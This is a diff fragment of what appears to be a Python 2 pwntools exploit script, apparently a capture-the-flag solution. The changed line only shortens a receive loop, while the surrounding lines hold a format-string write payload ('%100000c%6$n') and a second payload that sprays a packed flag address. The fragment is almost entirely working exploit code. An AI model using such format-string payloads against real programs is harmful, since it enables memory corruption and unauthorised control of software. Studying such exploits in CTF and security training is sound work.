@@ -11,7 +11,7 @@ print r.recv()
 payload = "%100000c%6$n"
 
 r.send(payload + "\x0a")
-for i in xrange(40): print r.recv()
+for i in xrange(30): print r.recv()
 
 addr_flag = 0x0804a0a0
 payload = p32(addr_flag) * 0x100
